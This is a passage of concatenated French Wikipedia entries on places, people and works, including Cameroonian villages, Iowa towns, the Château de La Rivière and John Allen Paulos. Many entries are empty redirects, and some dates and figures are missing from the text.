La rivière du Bras Coupé se déverse dans le canton de Lytton, dans un coude de rivière, sur la rive ouest de la rivière Désert ; après un parcours en serpentinant, cette dernière se déverse à son tour dans la rivière Gatineau à Maniwaki. Cette confluence de la rivière du Bras Coupé est située à :
Toponymie.
Le nom de la rivière du Bras Coupé fait allusion à la forme particulière du lac du Bras Coupé, qui est la source de la rivière. Le toponyme Rivière du Bras Coupé a été officialisé le à la Commission de toponymie du Québec.

</doc>
<doc id="10577095" url="https://fr.wikipedia.org/wiki?curid=10577095" title="Daniel Naprous">
Daniel Naprous

Daniel Naprous est un acteur, athlète et cascadeur britannique, né le .

</doc>
<doc id="10577099" url="https://fr.wikipedia.org/wiki?curid=10577099" title="Première Guerre séminole">
Première Guerre séminole



</doc>
<doc id="10577108" url="https://fr.wikipedia.org/wiki?curid=10577108" title="Gare de Sorel">
Gare de Sorel

La gare de Sorel est une ancienne gare ferroviaire située à Sorel-Tracy au Québec, Canada. Elle a été construite en 1898 par le South Shore Railway. La gare est citée immeuble patrimonial en 2012 .
Histoire et patrimoine ferroviaire.
La gare construite en 1898, érigée sur une ligne de chemin de fer qui permet de rejoindre les villes de Montréal, Nicolet et Saint-Hyacinthe. Construite en bois, la gare est un exemple typique des gares répandues dans les petites municipalités de la fin du XIXe siècle. La gare se présente avec un plan rectangulaire, s'élevant sur un étage et demi avec un toit à croupes débordant largement au-delà des murs (supportés par des consoles en bois). « Sur la façade principale, une avancée à trois pans est superposée par une lucarne épousant la même forme. À l'arrière, un avant-corps rectangulaire rythme l'élévation. Les façades sont revêtues de bardeau de bois. Les portes à imposte et les fenêtres à guillotine à carreaux sont de facture contemporaine. Les ouvertures rectangulaires sont encadrées d'épais chambranles en bois. Des planches cornières en bois complètent l'ornementation. ». Le bâtiment s'inspire de l'architecture pittoresque .
Nous remarquons aussi une fenêtre en saillie, qui permet à l'opérateur de surveiller la voie ferrée. « La gare de Sorel témoigne de l'apogée du transport ferroviaire et de son rôle dans le développement de plusieurs villes, dont celle de Sorel-Tracy » .
Le Canadien National abandonne la voie ferrée à Sorel en 1968. La ligne de chemin de fer devient une piste cyclable . Depuis sa fermeture au service ferroviaire, la gare servait de terminus d’autobus (en 1992) et de centre communautaire depuis 2014, offrant la possibilité de faire des achats collectifs en alimentation et de l’éducation alimentaire pour les jeunes .

</doc>
<doc id="10577120" url="https://fr.wikipedia.org/wiki?curid=10577120" title="Troisième Guerre servile">
Troisième Guerre servile



</doc>
<doc id="10577122" url="https://fr.wikipedia.org/wiki?curid=10577122" title="André Trantoul">
André Trantoul

André Trantoul est un coureur cycliste français. Il a participé à la poursuite par équipe, aux Jeux olympiques d'été de 1928.

</doc>
<doc id="10577123" url="https://fr.wikipedia.org/wiki?curid=10577123" title="Deuxième Guerre servile">
Deuxième Guerre servile



</doc>
<doc id="10577125" url="https://fr.wikipedia.org/wiki?curid=10577125" title="Première Guerre servile">
Première Guerre servile



</doc>
<doc id="10577127" url="https://fr.wikipedia.org/wiki?curid=10577127" title="International Finance Center">
International Finance Center

LInternational Finance Center est un gratte-ciel de 239 mètres construit en 2011 à Nanchang en Chine. 
Lien externe.
CTBUH

</doc>
<doc id="10577129" url="https://fr.wikipedia.org/wiki?curid=10577129" title="Deuxième Guerre macédonienne">
Deuxième Guerre macédonienne



</doc>
<doc id="10577136" url="https://fr.wikipedia.org/wiki?curid=10577136" title="Monte-Carlo Squash Classic 2012">
Monte-Carlo Squash Classic 2012

Le Monte-Carlo Squash Classic 2012 est l'édition 2012 du Monte-Carlo Squash Classic qui se déroule du au au Stade Louis-II à Monaco. Le tournoi fait partie de la catégorie "Silver 25" et il est doté de de prix.
La tenante du titre est Natalie Grinham qui s'impose à nouveau et remporte son face à Madeline Perry en perdant son premier jeu du tournoi, 6-11, 12-10, 11-2, 11-2 ().
Le tableau est composé de 16 participantes dont 4 issues du tableau de qualification.

</doc>
<doc id="10577139" url="https://fr.wikipedia.org/wiki?curid=10577139" title="Alphonse Thomann">
Alphonse Thomann

Alphonse Thomann est un fabricant de bicyclettes et de motocyclettes français. Il est important de distinguer la société portant le nom de la marque (sans le prénom).
La société ou est fondée vers 1908, boulevard de Versailles, à Suresnes, par les frères Alphonse et Jean Thomann. Alphonse Thomann est l'un des fondateurs de l', en 1910, qui devient la et porte les couleurs bleue avec une bande orange, la couleur des vélos A. Thomann. 
La société est dissoute en octobre 1911 et vendue à la Société , installée avenue Félix Faure, à Nanterre, depuis, 1908. La filiale ou construit des bicyclettes et des motocyclettes sous la marque (sans prénom), vélo orange avec un éléphant comme emblème. Thomann construit aussi des motocyclettes deux temps de 98 et . Après 1919, la marque est intégrée au groupe Alcyon.
En 1920, Jean fabrique des cycles et motocyclettes, à Paris, rue des Vertus, puis à Montreuil-sous-Bois, en 1926, sous le nom de , avec pour emblème un gorille.
En 1923-1924, Alphonse recrée une fabrique de cycles sous le nom , puis , avenue Georges-Clemenceau, à Puteaux ou Nanterre, en 1925, , en 1933. Gentil lui fait interdire l’utilisation des marques et . 
La marque sponsorise une équipe cycliste française, de cyclisme professionnel sur route, maillot orange à bande blanche, de 1909 à 1956

</doc>
<doc id="10577152" url="https://fr.wikipedia.org/wiki?curid=10577152" title="Bibassa">
Bibassa

Bibassa est une localité de la région du Centre au Cameroun, localisée dans la commune de Nanga-Eboko et le département de la Haute-Sanaga.
Population.
En 1963, Bibassa comptait 150 habitants, principalement des Badjia.
Lors du recensement de 2005, ce nombre s'élevait à .

</doc>
<doc id="10577158" url="https://fr.wikipedia.org/wiki?curid=10577158" title="Bifoulé">
Bifoulé

Bifoulé est une localité de la région du Centre au Cameroun, localisée dans la commune de Nanga-Eboko et le département de la Haute-Sanaga.
Population.
En 1963, Bifoulé comptait 229 habitants, principalement des Yangafeuk.
Lors du recensement de 2005, ce nombre s'élevait à .

</doc>
<doc id="10577160" url="https://fr.wikipedia.org/wiki?curid=10577160" title="Bikaga">
Bikaga

Bikaga est une localité de la région du Centre au Cameroun, localisée dans la commune de Nanga-Eboko et le département de la Haute-Sanaga.
Population.
En 1963, Bikaga comptait 35 habitants, principalement des Badjia.
Lors du recensement de 2005, ce nombre s'élevait à .

</doc>
<doc id="10577161" url="https://fr.wikipedia.org/wiki?curid=10577161" title="Bikang">
Bikang

Bikang est une localité de la région du Centre au Cameroun, située dans la commune de Nanga-Eboko et le département de la Haute-Sanaga.
Population.
En 1963, Bikang comptait , principalement des Bamvele.
Lors du recensement de 2005, ce nombre s'élevait à .

</doc>
<doc id="10577164" url="https://fr.wikipedia.org/wiki?curid=10577164" title="Bissaga">
Bissaga

Bissaga est une localité de la région du Centre au Cameroun, localisée dans la commune de Nanga-Eboko et le département de la Haute-Sanaga.
Population.
En 1963, Bissaga comptait 549 habitants, principalement des Yangafouk.
Lors du recensement de 2005, ce nombre s'élevait à .

</doc>
<doc id="10577165" url="https://fr.wikipedia.org/wiki?curid=10577165" title="Bitam (Nanga-Eboko)">
Bitam (Nanga-Eboko)

Bitam est une localité de la région du Centre au Cameroun, localisée dans la commune de Nanga-Eboko et le département de la Haute-Sanaga.
Population.
En 1963, Bitam comptait 121 habitants, principalement des Bamvele.
Lors du recensement de 2005, ce nombre s'élevait à .

</doc>
<doc id="10577168" url="https://fr.wikipedia.org/wiki?curid=10577168" title="Biwong (Nanga-Eboko)">
Biwong (Nanga-Eboko)

Biwong est une localité de la région du Centre au Cameroun, localisée dans la commune de Nanga-Eboko et le département de la Haute-Sanaga.
Population.
En 1963, Biwong comptait 131 habitants, principalement des Badjia.
Lors du recensement de 2005, ce nombre s'élevait à .

</doc>
<doc id="10577171" url="https://fr.wikipedia.org/wiki?curid=10577171" title="Déa (Cameroun)">
Déa (Cameroun)

Déa est une localité de la région du Centre au Cameroun, localisée dans la commune de Nanga-Eboko et le département de la Haute-Sanaga.
Population.
En 1963, Déa comptait 427 habitants, principalement des Badjia.
Lors du recensement de 2005, ce nombre s'élevait à .

</doc>
<doc id="10577172" url="https://fr.wikipedia.org/wiki?curid=10577172" title="Naissance en 1257">
Naissance en 1257

Cette page dresse une liste de personnalités nées au cours de l'année 1257 :

</doc>
<doc id="10577175" url="https://fr.wikipedia.org/wiki?curid=10577175" title="Biwong">
Biwong

Biwong peut aussi désigner :

</doc>
<doc id="10577182" url="https://fr.wikipedia.org/wiki?curid=10577182" title="Bill Christian">
Bill Christian



</doc>
<doc id="10577202" url="https://fr.wikipedia.org/wiki?curid=10577202" title="Décès en 1257">
Décès en 1257

Cette page dresse une liste de personnalités mortes au cours de l'année 1257 :

</doc>
<doc id="10577209" url="https://fr.wikipedia.org/wiki?curid=10577209" title="Naissance en 1258">
Naissance en 1258

Cette page dresse une liste de personnalités nées au cours de l'année 1258 :

</doc>
<doc id="10577213" url="https://fr.wikipedia.org/wiki?curid=10577213" title="La Maison de thé">
La Maison de thé

La Maison de thé (茶馆, pin yin : Cháguǎn) est une pièce de théâtre de Lao She publiée pour la première fois au début du mois de dans le numéro inaugural du magazine Harvest, édité par Ba Jin. La pièce sera éditée en un seul volume par le China Theatre Press en juin 1958. Elle met en scène plus de 60 personnages qui se rencontrent dans une maison de thé. Elle se déroule en trois actes pour autant d'époques (1898, les années 1920, et juste après la fin de la Deuxième Guerre Mondiale). Seul le lieu ne change pas : une maison de thé authentique et célèbre de Pékin.
Du 23 février au 5 mars 2019, la pièce de théâtre est de nouveau présenté par Ren Yi au théâtre de la capitale. Le 9 juin 2022, La Maison de thé reprend sa saison afin de commémorer le anniversaire de la fondation Beijing Ren Yi.
Réception critique.
La pièce a été très populaire à sa sortie, mais après le de Lao She en 1966, elle a été une des cibles emblématiques de la révolution culturelle.
Elle a été adaptée en 1982 au cinéma.
Résumé.
Le premier acte se déroule en 1898. À l'époque, l'impératrice douairière Cixi est à la tête d'un Empire chinois dépensier. Les clients du salon de thé méprisent les riches marchands occidentaux et n'hésitent pas à rivaliser de xénophobie. En effet, certains paysans sont si pauvres qu'ils doivent vendre leurs enfants pour subsister. Kang Liu sera contraint par le Liu Mazi de vendre fille, Kang Shunzi, à l'eunuque Pang, un vieil homme riche et influent à la cour.
Vingt ans plus tard, la Chine est devenue une République. Malgré tout, la situation des plus nécessiteux ne s'est pas améliorée. Wang Lifa, le propriétaire du salon, résiste difficilement. Le mari de Kang Shunzi, et elle a du mal a nourrir son fils adoptif, Kang Dali. Elle propose alors ses services à Wang Lifa. Ayant croisé Liu Mazi au salon de thé, elle a l'intention de le tuer pour lui faire payer ce mariage forcé mais d'autres clients du salon s'en chargeront à sa place.
Le troisième et dernier acte se déroule après le départ de l'occupation japonaise. Le Kuo ming deng tente de prendre le contrôle de Pékin mais la population, mourant de faim, se rebelle. Kang Dali, à la tête d'un mouvement clandestin, organise des manifestations. Wang Lifa ne peut plus tenir le salon de thé et le fils de Lui Mazi cherche à venger son père.
Influences et représentations.
Depuis sa publication, La Maison de thé a été adaptée sous de nombreuses formes telles que le théâtre, le cinéma et la télévision.

</doc>
<doc id="10577227" url="https://fr.wikipedia.org/wiki?curid=10577227" title="Alta (Iowa)">
Alta (Iowa)

Alta est une ville du comté de Buena Vista, en Iowa, aux États-Unis. La ville est fondée en 1872 et incorporée le .
&lt;mapframe zoom=12 latitude =42.671944 longitude =-95.304722 align=right width=250 height=250 text="Carte interactive d'Alta"&gt; { "type": "ExternalData", "service": "geoshape", "ids": "Q1913550", "properties": { "fill": "#fc3", "stroke": "#ac6600" } } &lt;/mapframe&gt;

</doc>
<doc id="10577229" url="https://fr.wikipedia.org/wiki?curid=10577229" title="Ameera al-Taweel">
Ameera al-Taweel

La Princesse Ameera bint Aidan bin Nayef al-Taweel Al-Otaibi (), plus connue sous le nom Ameera al-Taweel ou Amira Al-Tawil, née le à Riyad, est une princesse et philanthrope saoudienne. Mariée puis divorcée au Prince Al-Walid, elle a assumé le rôle de vice-présidente de l'Alwaleed Philanthropies Al Waleed bin Talal Foundation et est membre du conseil d'administration de Silatech.
Biographie.
La Princesse Ameerah al-Taweel est née le à Riyad en Arabie saoudite. Son père est Aidan bin Nayef Al-Taweel Al-Otaibi. Elle a été élevée par sa mère et ses grands-parents à la suite du divorce de ses parents. À l'âge de dix-huit ans, elle rencontre le Prince Al-Walid, de vingt-huit ans son aîné, après une interview de ce dernier pour le journal de l'école d'Ameerah. Il s'agit d'un membre de la dynastie Al Saoud. Ils se marient alors, puis divorcent en . La Princesse Ameerah est diplômée de l'Université de New Haven en droit des affaires. Elle profite de sa position, de son rang et de la fortune de son mari qui l'encourage pour soutenir les actions caritatives et défend l’égalité des droits entre les hommes et les femmes partout dans le monde. Elle déclare notamment vouloir devenir la première femme à conduire en Arabie saoudite et que les femmes soient traitées sur un pied d'égalité en termes d'héritage, devenant au côté de Rania de Jordanie l'une des femmes les plus influentes du Moyen-Orient.

</doc>
<doc id="10577232" url="https://fr.wikipedia.org/wiki?curid=10577232" title="Karlovy Vary International Film Festival">
Karlovy Vary International Film Festival



</doc>
<doc id="10577234" url="https://fr.wikipedia.org/wiki?curid=10577234" title="Lakeside (Iowa)">
Lakeside (Iowa)

Lakeside est une ville du comté de Buena Vista, en Iowa, aux États-Unis. 
Elle est incorporée le 
&lt;mapframe zoom=12 latitude =42.619722 longitude =-95.174167 align=right width=250 height=250 text="Carte interactive de Lakeside"&gt; { "type": "ExternalData", "service": "geoshape", "ids": "Q1905659", "properties": { "fill": "#fc3", "stroke": "#ac6600" } } &lt;/mapframe&gt;

</doc>
<doc id="10577242" url="https://fr.wikipedia.org/wiki?curid=10577242" title="Raindance Film Festival">
Raindance Film Festival



</doc>
<doc id="10577245" url="https://fr.wikipedia.org/wiki?curid=10577245" title="Fixi">
Fixi

Fixi (né François-Xavier Bossard en 1974) est un musicien et compositeur français. 
Particulièrement remarqué pour son jeu de l'accordéon, moderne et créatif, il a joué dans de nombreux groupes, notamment Java, mélangeant les styles de musique, comme le hip-hop-musette, le reggae, le funk, le afrobeat, le rock et le maloya.
Biographie.
Fixi a une formation classique (batterie, piano, trombone) et devient professionnel à l'âge de 17 ans.
Il commence par jouer avec Sinclair et Tony Allen. Il a aussi joué dans Java ainsi qu'avec Winston McAnuff, avec Alexis HK et avec -M-. 
En 2016, il signe la BO du film "La Fille du patron" d'Olivier Loustau.

</doc>
<doc id="10577252" url="https://fr.wikipedia.org/wiki?curid=10577252" title="Lakeside (homonymie)">
Lakeside (homonymie)

Lakeside peut se rapporter à :

</doc>
<doc id="10577254" url="https://fr.wikipedia.org/wiki?curid=10577254" title="Château de La Rivière (Gironde)">
Château de La Rivière (Gironde)

Le château de La Rivière est une propriété viticole du située en Gironde sur la commune de La Rivière.
Le domaine s'étend sur , dont de vignes produisant des vins AOC Fronsac.
Il domine la vallée de la Dordogne et la rivière éponyme en contrebas.
Présentation.
Gaston de L'Isle, maire de Bordeaux (mort en 1579), entreprend la construction du château actuel, qui est achevée en 1572.
Histoire.
Charlemagne installe une tour de guet sur un promontoire à l'emplacement d'une tombelle gallo-romaine en 769. Elle sert de vigie pour alerter le camp militaire situé plus loin à Fronsac.
Gaston de l'Isle I en est le propriétaire en 1260 puis Gaston de l'Isle II (pro-anglais) (1339), Eyrin Aubert (anglais) (1353) (donation de Guillaume Sans de Pommiers, vicomte de Fronsac, épouse Jeanne de Fronsac, Guilhem Aubert (son fils) (1373) et « Noble Dona Madona Comtor Aubert » (sa fille) dite la « Dame de La Rivière » (= seigneur de La Rivière) (1385), Marguerite de Pommiers (fille de Guillaume Sans) et Peyrot des Fontaines, et leur fils Jean (1417, ou 1419 ?).
En 1448 Gaston de l'Isle III, commandant la forteresse de Castelnau durant la guerre de Cent Ans pour le compte du Roi d’Angleterre, marié à Catherine de La Lande, seigneur de La Brède dont il aura trois fils (Jean, Pierre et Gaillard) et deux filles (Catherine et Marguerite), en devient propriétaire. Jean puis Pierre puis Gaillard dirigeront successivement La Rivière. Gaillard a deux enfants : Gaston et Françoise.
Gaston de l'Isle IV, maire de Bordeaux est le propriétaire suivant en 1553 (mort en 1579), marié à Bonnaventure de Lur. Ils ont deux fils Louis et ? (qui mourront sans enfants) et trois filles Jeanne (mariée à Jean Bonnevin), Françoise et Marguerite. Il entreprend la construction du château actuel, achevé en 1572. 
La construction du château est achevée en 1577 et Jeanne de l'Isle en hérite. Son fils et petit-fils de Gaston lui succède en 1620. À sa mort (1631), le château est lourdement endetté et est saisi. Le château traverse une période judiciaire complexe lié à la succession sous François de Mons (1631-1639) puis en 1639 Marthe Viaud, femme de Samuel Eusebe Campet de Saujon, en devient propriétaire. Le cardinal de Richelieu, Duc de Fronsac, lui donne La Rivière (et sa seigneurie), pour stopper les problèmes judiciaires. 
En 1736, le château devient la propriété de Charles François de Campet de Saujon, frère de Charles Gaspard, fils de Louis. Il a un fils, Charles Olive Floris, et une fille, Marie Charlotte. Le Bain des Dames est construit. Charles Olive Floris de Campet de Saujon succède à son père et meurt en 1758. Marie-Charlotte Hippolyte de Campet de Saujon, comtesse de Boufflers, en devient propriétaire. Elle meurt le 9 décembre 1800 et n’a pas de succession en France. Son fils unique est en Amérique.
Le Sieur Labitte achète le château en vente publique à Paris en 1802. Sans héritiers, il le vend à son avocat, Nicolas Antoine Massé de Cormeille en 1817. À sa mort le 13 janvier 1843, son fils Alexandre en hérite et en sera propriétaire jusqu'en 1851 avec sa mère Louise Massé de Cormeille (elle meurt le 4 octobre 1851).
Alexandre Massé de Cormeille, né en 1796, meurt célibataire et sans enfant le 28 janvier 1880. Victorine Gaboré (Madame Fuinel), en hérite alors comme légataire universelle (elle était une amie proche d’Alexandre). Mariée après cet héritage au colonel Jean-François Fuinel, celui-ci entreprend les travaux de rénovation du château, avec Duthoit (élève de Viollet-le-Duc) comme architecte. Les travaux prennent fin en 1891. Le colonel Fuinel meurt en 1897 et Madame Fuinel en 1904, sans enfants.
Jacques Paulin de Cazeuneuve achète en décembre 1899 le château de La Rivière ainsi que le château de Carles (annexé à La Rivière en 1639, et où réside Monsieur Cazeuneuve). René Mortier-Quarré, ingénieur au château, dirige celui-ci. Il l’achète à son employeur en 1903. Fin 1903, son propriétaire est René Mortier puis en 1925, Émile Balluteaud, négociant en vin à Blanzac achète le château.
Jacques Borie est le propriétaire du château en 1962. Il a deux enfants (un garçon et une fille) mais face à des difficultés financières, il est contraint de vendre la propriété.
En septembre 1994, le propriétaire est Jean Leprince. Le château est dirigé par sa fille Valérie et son gendre Xavier Péneau. Après le décès accidentel en février 2002 de Jean Leprince, la propriété connait des difficultés financières et doit être vendue. En septembre 2003 son propriétaire devient James Grégoire qui, le 19 décembre 2013 vend la propriété à Lam Kok, homme d’affaires chinois, président du groupe Brilliant, spécialisé dans la vente de thés de Pu'er. Désireux de lui faire visiter le domaine à l'aide de son hélicoptère, il s'écrase dans la Dordogne, provoquant la mort de James Grégoire, de Lam Kok et de son fils de 12 ans, ainsi que de son conseiller. Madame Lau, veuve de Lam Kok, rescapée de l'accident, devient alors, seule, la propriétaire de La Rivière. 
Dans la culture populaire.
Le tournage du film Cocorico s'est déroulé dans ce château.

</doc>
<doc id="10577256" url="https://fr.wikipedia.org/wiki?curid=10577256" title="Décharge de classe 3">
Décharge de classe 3



</doc>
<doc id="10577257" url="https://fr.wikipedia.org/wiki?curid=10577257" title="Décharges de classe 3">
Décharges de classe 3



</doc>
<doc id="10577258" url="https://fr.wikipedia.org/wiki?curid=10577258" title="Instituto Caro y Cuervo">
Instituto Caro y Cuervo



</doc>
<doc id="10577259" url="https://fr.wikipedia.org/wiki?curid=10577259" title="Installations de stockage de déchets inertes">
Installations de stockage de déchets inertes



</doc>
<doc id="10577261" url="https://fr.wikipedia.org/wiki?curid=10577261" title="Championnats d'Europe de triathlon 1998">
Championnats d'Europe de triathlon 1998

Les championnats d'Europe de triathlon 1998 sont la quatorzième édition des championnats d'Europe de triathlon, une compétition internationale de triathlon sous l'égide de la fédération européenne de ce sport. L'épreuve est constituée de 1 500 mètres de natation, 40 kilomètres de vélo puis 10 kilomètres de course à pied.
Cette édition se tient dans la ville autrichienne de Velden et elle est remportée par le britannique Andrew Johns chez les hommes et par la néerlandaise Wieke Hoogzaad chez les femmes.
Notes et références.
ITU European Championship 1998 Velden

</doc>
<doc id="10577262" url="https://fr.wikipedia.org/wiki?curid=10577262" title="Potentille blanche">
Potentille blanche

La Potentille blanche ("Potentilla alba") est une espèce de plantes à fleurs de la famille des Rosacées.
Description.
C'est une plante herbacée vivace haute de 5 à aux feuilles velues composées de cinq folioles, aux fleurs blanches dont les pétales sont légèrement échancrés. La floraison a lieu d'avril à mai.
Distribution.
Europe centrale. En France, l'espèce est rare et protégée dans le Jura, les Alpes.
Habitat.
Pelouses calcaires et bois clairs de 200 à .

</doc>
<doc id="10577264" url="https://fr.wikipedia.org/wiki?curid=10577264" title="Potentilla alba">
Potentilla alba



</doc>
<doc id="10577265" url="https://fr.wikipedia.org/wiki?curid=10577265" title="Millo">
Millo

Patronymes.
Millo est un patronyme porté notamment par :
Architecture.
Le Millo ou Milo (en hébreu: המלוא) est une structure à Jérusalem en pierres étagées mentionnée dans la "Bible" hébraïque et qui désigne une partie de l'ancienne cité de David.

</doc>
<doc id="10577295" url="https://fr.wikipedia.org/wiki?curid=10577295" title="Ginevra Molly Weasley">
Ginevra Molly Weasley



</doc>
<doc id="10577309" url="https://fr.wikipedia.org/wiki?curid=10577309" title="Bill Drayton">
Bill Drayton

William « Bill » Drayton (né à New York, aux États-Unis) est un entrepreneur social. Il a popularisé l'expression « entrepreneur social », un concept apparu en 1972.
Drayton est le fondateur et actuel président d'Ashoka, une ONG vouée à la recherche et à l'encouragement des entrepreneurs sociaux dans le monde entier. Drayton préside également deux autres ONG, Youth Venture et Get America Working!.
Il a reçu le prix Princesse des Asturies en 2011.

</doc>
<doc id="10577311" url="https://fr.wikipedia.org/wiki?curid=10577311" title="Botanical Survey of India">
Botanical Survey of India



</doc>
<doc id="10577313" url="https://fr.wikipedia.org/wiki?curid=10577313" title="Aéroport d'Esbjerg">
Aéroport d'Esbjerg

L'aéroport d'Esbjerg () est un petit aéroport situé à 5 milles nautiques () au nord-est de Esbjerg, Danemark. L'aéroport a ouvert le . La principale utilisation de cet aéroport se fait en tant qu'héliport pour les plates formes offshore pétrolières pour la Mer du Nord.
&lt;mapframe zoom=12 latitude =55.525833 longitude =8.55333 align=left width=250 height=250 text="Carte interactive de l'aéroport d'Esbjerg"&gt;{
 "type": "FeatureCollection",
 "features": [
 "type": "Feature",
 "properties": {
 "marker-color": "#ff0000",
 "marker-size": "medium",
 "marker-symbol": "airport"
 "geometry": {
 "type": "Point",
 "coordinates": [
 8.55333,
 55.525833
 ]
}&lt;/mapframe&gt;
Compagnies aériennes et destinations.
Actualisé le 08/02/2023

</doc>
<doc id="10577321" url="https://fr.wikipedia.org/wiki?curid=10577321" title="Charles Charlay-Pompon">
Charles Charlay-Pompon

Charles-Socrate Pompon, dit Charlay-Pompon, né le à Paris (ancien 6), où il est mort dans le arrondissement le , est un artiste peintre français.
Biographie.
Charlay-Pompon naît en 1836 à Paris. Élève d'Alexandre Rapin (1839-1889), , il expose au Salon de Paris de 1880 à 1894.
Il reçoit une mention honorable en 1882.
En 1885 il obtient une médaille de troisième classe.
Il meurt à Paris le 30 juillet 1904, et son décès entraîne un procès entre sa fille et l'organisme auquel l'artiste avait légué ses biens, la Caisse des victimes du devoir : la vente entraîna un legs d'un montant de francs-or.

</doc>
<doc id="10577330" url="https://fr.wikipedia.org/wiki?curid=10577330" title="Eanfrith">
Eanfrith



</doc>
<doc id="10577334" url="https://fr.wikipedia.org/wiki?curid=10577334" title="John Allen Paulos">
John Allen Paulos

John Allen Paulos (né le ) est un Américain, professeur de mathématiques à l'université Temple de Philadelphie, en Pennsylvanie. Il est principalement connu pour avoir insisté sur les dangers de l'innumérisme, qu'il a défini comme l'ensemble des erreurs et des incompréhensions concernant les nombres, la logique et les probabilités.
Études.
Paulos est né à Denver, et grandit à Chicago et à Milwaukee, où il fait ses études, recevant son PhD en mathématiques en 1974 à l'université du Wisconsin à Madison. Il se décrit comme ayant été toute sa vie un sceptique.
Carrière.
Ses travaux académiques portent principalement sur la logique mathématique et les probabilités.
Son livre de 1988, "Innumeracy: Mathematical Illiteracy and its Consequences" ("Innumérisme : l'illétrisme en mathématiques et ses conséquences") est un bestseller et en 1995, "A Mathematician Reads the Newspaper" ("Un mathématicien lit le journal") développe ses critiques. Dans ses livres, Paulos discute l'innumérisme au moyen d'anecdotes et de scénarios, encourageant les lecteurs à observer leur monde de manière plus quantitative.
Il écrit aussi sur d'autres sujets, souvent en « combinant des disciplines disparates », comme les bases mathématiques et philosophiques de l'humour dans "Mathematics and Humor" et "I Think, Therefore I Laugh", les marchés dans "A Mathematician Plays the Stock Market", les aspects quantitatifs de la narration dans "Once Upon a Number", les arguments pour et contre l'existence de Dieu dans "Irreligion", et plus récemment les biographies dans "A Numerate Life".
Paulos écrit également des chroniques à contenu mathématique pour "The Guardian" et est membre du Committee for Skeptical Inquiry. Ses articles mensuels pour ABC News intitulés "Who's Counting" s'intéressent aux aspects mathématiques des nouvelles publiées dans la presse. Il est souvent intervenu à la radio et à la télévision, en particulier dans une adaptation de la BBC de son "A Mathematician Reads the Newspaper", ainsi qu'à 20/20, et aux émissions de Larry King et David Letterman. Il tweete fréquemment à @JohnAllenPaulos.
En 2001, Paulos donne un cours de « quantitative literacy » ("alphabétisation quantitative") pour la Columbia University School of Journalism ; ce cours amène l'université de Columbia et d'autres à développer des programmes stimulant une pratique du journalisme plus précise et s'appuyant davantage sur des données chiffrées.

</doc>
<doc id="10577351" url="https://fr.wikipedia.org/wiki?curid=10577351" title="Institute of Pacific Relations">
Institute of Pacific Relations



</doc>
<doc id="10577364" url="https://fr.wikipedia.org/wiki?curid=10577364" title="Serge Kevyn Aboué Angoué">
Serge Kevyn Aboué Angoué

Serge Kevyn Aboué Angoué, parfois appelé Serge Kevyn ou Kevyn Angoué, est un footballeur international gabonais né le à Port-Gentil. Évoluant au poste d'attaquant-avant-centre, il joue actuellement pour Vannes Olympique Club.
Biographie.
Serge Angoué est un jeune gabonais passionné de football. Actuellement en France, il est la nouvelle recrue du Vannes Olympique Club. 
En club.
Kevyn Angoué a été formé au Sporting Club de Braga (Portugal), il a joué aux côtés du FC Vizela (Portugal), de l'UD Leiria (Portugal), Martimon Funchal, Al Ittihad (Tripoli) puis Mumbaï City (Inde). Il est passé par l’Unió Esportiva Engordany (Andorre, Espagne) et le natif de Port-Gentil (Gabon) a récemment rejoint les rangs du Vannes OC pour la saison 2022-2023.
En équipe nationale.
Serge Kevyn Aboué Angoué réalise ses débuts avec l'équipe du Gabon le , lors d'un match amical face au Maroc (match nul 1-1).
En , il est convoqué par José Antonio Camacho dans sa liste de 23 joueurs pour disputer la Coupe d'Afrique des nations 2017 à domicile.
Statistiques.
Le tableau ci-dessous récapitule les statistiques de Serge Kevyn Aboué Angoué lors de sa carrière en club :

</doc>
<doc id="10577366" url="https://fr.wikipedia.org/wiki?curid=10577366" title="Pesjak">
Pesjak



</doc>
<doc id="10577368" url="https://fr.wikipedia.org/wiki?curid=10577368" title="Marathon (Iowa)">
Marathon (Iowa)

Marathon est une ville du comté de Buena Vista, en Iowa, aux États-Unis. La ville est incorporée le . Le nom de la ville commémore la bataille de Marathon.
&lt;mapframe zoom=12 latitude =42.86 longitude =-94.981667 align=right width=250 height=250 text="Carte interactive de Marathon."&gt; { "type": "ExternalData", "service": "geoshape", "ids": "Q1929865", "properties": { "fill": "#fc3", "stroke": "#ac6600" } } &lt;/mapframe&gt;

</doc>
<doc id="10577369" url="https://fr.wikipedia.org/wiki?curid=10577369" title="La Fin de la nuit (téléfilm)">
La Fin de la nuit (téléfilm)

La Fin de la nuit est un téléfilm français réalisé par Lucas Belvaux, adaptation du roman du même titre de François Mauriac, sur la vie de Thérèse Desqueyroux quand elle retrouve sa fille, vingt ans après en avoir été séparée. 
Synopsis.
Thérèse vit seule dans un appartement parisien. Un soir, elle a la surprise de voir arriver sa fille Marie qu'elle n'a guère vue depuis 20 ans. Marie apprend à sa mère qu'elle a quitté son père chez qui elle vivait dans les Landes car elle est amoureuse d'un étudiant maghrébin, Mourad. Thérèse lui dévoile la raison de son départ de la maison familiale et du quasi-abandon de sa fille : elle a tenté d'assassiner son mari mais a obtenu un non-lieu grâce au témoignage de la victime en sa faveur. Cependant, son mari lui a demandé de partir loin de la maison familiale et de lui laisser la garde de leur fille.Mourad ayant toujours vécu dans un milieu modeste de la banlieue parisienne est réticent à se rapprocher d'une fille d'une riche famille bourgeoise. Thérèse décide alors de rencontrer Mourad...
Fiche technique.
 : sur La Trois&lt;br&gt;
 : sur France 3
Compétition.
Ce téléfilm est présenté en compétition officielle du FIPA en 2016.

</doc>
<doc id="10577371" url="https://fr.wikipedia.org/wiki?curid=10577371" title="Serge Kevyn">
Serge Kevyn



</doc>
<doc id="10577373" url="https://fr.wikipedia.org/wiki?curid=10577373" title="2017 en animation asiatique">
2017 en animation asiatique

2016 en animation asiatique - 2017 en animation asiatique - 2018 en animation asiatique

</doc>
<doc id="10577375" url="https://fr.wikipedia.org/wiki?curid=10577375" title="Nas Air">
Nas Air



</doc>
<doc id="10577383" url="https://fr.wikipedia.org/wiki?curid=10577383" title="Greenville (Floride)">
Greenville (Floride)

 est une ville américaine située dans le comté de Madison en Floride. Elle fait partie de la région de Big Bend.
Démographie.
En 2010, sa population est de .
&lt;mapframe zoom=12 latitude =30.46666 longitude =-83.6333 align=left width=250 height=250 text="Carte interactive de Greenville"&gt; { "type": "ExternalData", "service": "geoshape", "ids": "Q2092701", "properties": { "fill": "#fc3", "stroke": "#ac6600" } } &lt;/mapframe&gt;

</doc>
<doc id="10577388" url="https://fr.wikipedia.org/wiki?curid=10577388" title="Rembrandt (Iowa)">
Rembrandt (Iowa)

